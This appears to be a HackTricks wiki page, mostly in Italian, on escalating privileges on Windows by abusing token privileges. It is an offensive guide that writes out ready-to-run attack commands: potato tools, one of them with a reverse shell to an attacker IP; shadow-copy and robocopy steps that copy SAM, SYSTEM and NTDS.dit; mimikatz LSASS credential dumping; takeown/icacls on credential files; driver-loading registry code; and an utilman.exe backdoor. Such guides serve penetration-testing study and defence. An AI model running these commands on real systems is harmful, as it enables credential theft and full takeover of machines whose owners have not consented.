# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Se **non sai cosa sono i Windows Access Tokens** leggi questa pagina prima di continuare:


{{#ref}}
access-tokens.md
{{#endref}}

**Forse potresti essere in grado di elevare i privilegi abusando dei token che hai già**

### SeImpersonatePrivilege

Questo è un privilege che è posseduto da qualsiasi processo e consente l'impersonation (ma non la creazione) di qualsiasi token, a condizione che si possa ottenere un handle ad esso. Un privileged token può essere acquisito da un Windows service (DCOM) inducendolo a eseguire autenticazione NTLM contro un exploit, abilitando successivamente l'esecuzione di un processo con privilegi SYSTEM. Questa vulnerabilità può essere sfruttata usando vari strumenti, come [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (che richiede che winrm sia disabilitato), [SweetPotato](https://github.com/CCob/SweetPotato) e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato è legacy**: su Windows 10 1809+/Server 2019+, preferisci **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, o **PrintSpoofer** a seconda di quale superficie RPC/COM è ancora raggiungibile.
- Se hai compromesso un servizio in esecuzione come **`LOCAL SERVICE`** o **`NETWORK SERVICE`** e `whoami /priv` mostra un **filtered token** senza `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupera prima il **default privilege set** dell'account (per esempio con **FullPowers**) e poi riprova la famiglia potato.
- Alcuni fork più recenti sono più facili da usare per l'operatore rispetto agli strumenti originali. Per esempio, **SigmaPotato** aggiunge reflection/esecuzione in-memory e compatibilità moderna con Windows, mentre **PrintNotifyPotato** abusa del servizio COM PrintNotify ed è spesso utile quando il classico percorso Spooler è disabilitato.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

È molto simile a **SeImpersonatePrivilege**, utilizzerà lo **stesso metodo** per ottenere un token privilegiato.\
Poi, questo privilegio consente di **assegnare un token primario** a un nuovo processo/sospeso. Con il token di impersonation privilegiato puoi derivare un token primario (DuplicateTokenEx).\
Con il token, puoi creare un **nuovo processo** con 'CreateProcessAsUser' oppure creare un processo sospeso e **impostare il token** (in generale, non puoi modificare il token primario di un processo in esecuzione).

### SeTcbPrivilege

Se hai abilitato questo token puoi usare **KERB_S4U_LOGON** per ottenere un **token di impersonation** per qualsiasi altro utente senza conoscere le credenziali, **aggiungere un gruppo arbitrario** (admins) al token, impostare il **livello di integrità** del token su "**medium**", e assegnare questo token al **thread corrente** (SetThreadToken).

### SeBackupPrivilege

Il sistema viene indotto a **concedere tutto l'accesso in lettura** a qualsiasi file (limitato alle operazioni di lettura) da questo privilegio. Viene utilizzato per **leggere gli hash delle password degli account Administrator locali** dal registro, dopodiché strumenti come "**psexec**" o "**wmiexec**" possono essere usati con l'hash (tecnica Pass-the-Hash). Tuttavia, questa tecnica fallisce in due condizioni: quando l'account Local Administrator è disabilitato, oppure quando è in vigore una policy che rimuove i diritti amministrativi dai Local Administrators che si connettono in remoto.\
In pratica, il workflow built-in più affidabile è di solito **VSS + `robocopy /b`**: crea/esponi una shadow copy, poi copia `SAM`/`SYSTEM` o `NTDS.dit` in **backup mode**, che bypassa le ACL del file.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Puoi **abusare di questo privilegio** con:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- seguendo **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Oppure come spiegato nella sezione **escalating privileges with Backup Operators** di:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Il privilegio di **write access** a qualsiasi file di sistema, indipendentemente dalla Access Control List (ACL) del file, è fornito da questo privilegio. Apre numerose possibilità di escalation, inclusa la capacità di **modify services**, eseguire DLL Hijacking e impostare **debuggers** tramite Image File Execution Options, tra varie altre tecniche.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege è un privilegio potente, particolarmente utile quando un utente possiede la capacità di impersonate tokens, ma anche in assenza di SeImpersonatePrivilege. Questa capacità si basa sulla possibilità di impersonare un token che rappresenta lo stesso utente e il cui integrity level non supera quello del processo corrente.

**Punti chiave:**

- **Impersonation senza SeImpersonatePrivilege:** È possibile sfruttare SeCreateTokenPrivilege per EoP impersonando token in condizioni specifiche.
- **Condizioni per l'Impersonation del Token:** L'Impersonation riuscita richiede che il token target appartenga allo stesso utente e abbia un integrity level minore o uguale a quello del processo che tenta l'impersonation.
- **Creazione e Modifica di Impersonation Tokens:** Gli utenti possono creare un impersonation token e potenziarlo aggiungendo il SID (Security Identifier) di un gruppo privilegiato.

### SeLoadDriverPrivilege

Questo privilegio permette di **load and unload device drivers** con la creazione di una voce di registry con valori specifici per `ImagePath` e `Type`. Poiché l'accesso in scrittura diretto a `HKLM` (HKEY_LOCAL_MACHINE) è limitato, deve essere usato `HKCU` (HKEY_CURRENT_USER). Tuttavia, per rendere `HKCU` riconoscibile dal kernel per la configurazione del driver, è necessario seguire un percorso specifico.

L'uso offensivo moderno è di solito **BYOVD** (bring your own vulnerable driver): caricare un kernel driver **signed but vulnerable** e poi usare i suoi IOCTL per disabilitare le protezioni o arrivare all'esecuzione di codice in kernel. Tieni presente che nelle recenti build di Windows 11/Server la **Microsoft vulnerable driver blocklist** e/o **HVCI/Memory Integrity** spesso rompono le vecchie chain pubbliche, quindi i classici esempi in stile `szkg64.sys` non sono più universalmente affidabili.

Questo percorso è `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, dove `<RID>` è il Relative Identifier dell'utente corrente. All'interno di `HKCU`, questo intero percorso deve essere creato, e devono essere impostati due valori:

- `ImagePath`, che è il path del binario da eseguire
- `Type`, con valore `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Passi da seguire:**

1. Accedere a `HKCU` invece di `HKLM` a causa delle restrizioni di write access.
2. Creare il path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dentro `HKCU`, dove `<RID>` rappresenta il Relative Identifier dell'utente corrente.
3. Impostare `ImagePath` sul path di esecuzione del binario.
4. Assegnare `Type` come `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Altri modi per abusare di questo privilege in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Questo è simile a **SeRestorePrivilege**. La sua funzione principale consente a un processo di **assumere la proprietà di un object**, aggirando la necessità di un accesso discrezionale esplicito tramite la concessione dei diritti di accesso WRITE_OWNER. Il processo prevede innanzitutto di ottenere la proprietà della chiave di registro desiderata a fini di scrittura, quindi di modificare il DACL per abilitare le operazioni di scrittura.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Questo privilegio consente di **debug other processes**, inclusa la lettura e scrittura nella memoria. Con questo privilegio si possono usare varie strategie di memory injection, in grado di eludere la maggior parte delle soluzioni antivirus e host intrusion prevention.

Su Windows moderni, ricorda che `SeDebugPrivilege` di solito basta per aprire **non-protected SYSTEM processes** e duplicarne i token, ma **non** garantisce che tu possa accedere a **LSASS**. Se **RunAsPPL / LSA Protection** è abilitato, i processi non protetti non possono leggere o iniettare in LSASS anche se `SeDebugPrivilege` è presente. In tal caso, ruba un token da un altro SYSTEM process non-PPL, oppure combina con un PPL bypass/BYOVD invece di presumere che `procdump` funzionerà. Per un esempio completo di copia del token usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, vedi [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Puoi usare [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) da [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) per **capture the memory of a process**. In particolare, questo può essere applicato al processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, che è responsabile della memorizzazione delle credenziali dell'utente una volta che l'utente ha eseguito con successo l'accesso a un sistema.

Puoi quindi caricare questo dump in mimikatz per ottenere le password:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Se vuoi ottenere una shell `NT SYSTEM` puoi usare:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Questo diritto (Perform volume maintenance tasks) consente di aprire handle di dispositivi di volume raw (ad esempio, \\.\C:) per I/O diretto su disco che bypassa le ACL NTFS. Con questo puoi copiare byte di qualsiasi file sul volume leggendo i blocchi sottostanti, abilitando la lettura arbitraria di file sensibili (ad esempio, chiavi private della macchina in %ProgramData%\Microsoft\Crypto\, hive del registry, SAM/NTDS tramite VSS). È particolarmente impattante sui server CA, dove esfiltrare la chiave privata della CA consente di forgiare un Golden Certificate per impersonare qualsiasi principal.

See detailed techniques and mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
I **token che appaiono come Disabled** di solito possono essere abilitati, quindi spesso puoi abusare sia dei privilegi _Enabled_ che di quelli _Disabled_.

### Enable All the tokens

Se hai privilegi disabilitati, puoi usare lo script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) per abilitare tutti i token:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Leggi file sensibili con `robocopy /b` o con helper dedicati compatibili con SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ottimo per `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, e a volte `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` è comodo, ma i cmdlet/API dedicati a SeBackup sono spesso più flessibili per file bloccati/aperti.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Crea token arbitrari, inclusi diritti di amministratore locale, con `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplica un token SYSTEM **non-PPL** o esegui il dump della memoria di un processo non protetto.                                                                                                                                                                                                                                                                 | <p>Il dump di LSASS è comunemente bloccato se RunAsPPL/LSA Protection è abilitato.</p><p>Script disponibile su [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Usa la **famiglia Potato** / impersonation su named-pipe per avviare SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, ecc.).                                                                                                                                                                                    | <p>Più pratico da account di servizio come IIS APPPOOL, MSSQL, attività pianificate, o qualsiasi contesto che possieda già `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Carica un driver kernel firmato ma vulnerabile (BYOVD)<br>2. Usa gli IOCTL del driver per ottenere lettura/scrittura kernel, disabilitare strumenti di sicurezza o elevare a SYSTEM<br><br>In alternativa, il privilegio può essere usato per scaricare driver legati alla sicurezza con il comando builtin <code>fltMC</code>, ad esempio <code>fltMC sysmondrv</code></p>                     | <p>Driver pubblici più vecchi come <code>szkg64.sys</code> sono sempre più bloccati sulle versioni moderne di Windows dalla vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Avvia PowerShell/ISE con il privilegio SeRestore presente.<br>2. Abilita il privilegio con <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rinomina utilman.exe in utilman.old<br>4. Rinomina cmd.exe in utilman.exe<br>5. Blocca la console e premi Win+U</p> | <p>L'attacco può essere rilevato da alcuni software AV.</p><p>Un metodo alternativo si basa sulla sostituzione dei binari dei servizi memorizzati in "Program Files" usando lo stesso privilegio</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rinomina cmd.exe in utilman.exe<br>4. Blocca la console e premi Win+U</p>                                                                                                                                       | <p>L'attacco può essere rilevato da alcuni software AV.</p><p>Un metodo alternativo si basa sulla sostituzione dei binari dei servizi memorizzati in "Program Files" usando lo stesso privilegio.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipola i token per includere i diritti di amministratore locale. Potrebbe richiedere SeImpersonate.</p><p>Da verificare.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Dai un'occhiata a questa tabella che definisce i token di Windows: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Dai un'occhiata a [**questo paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) su privesc con i token.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
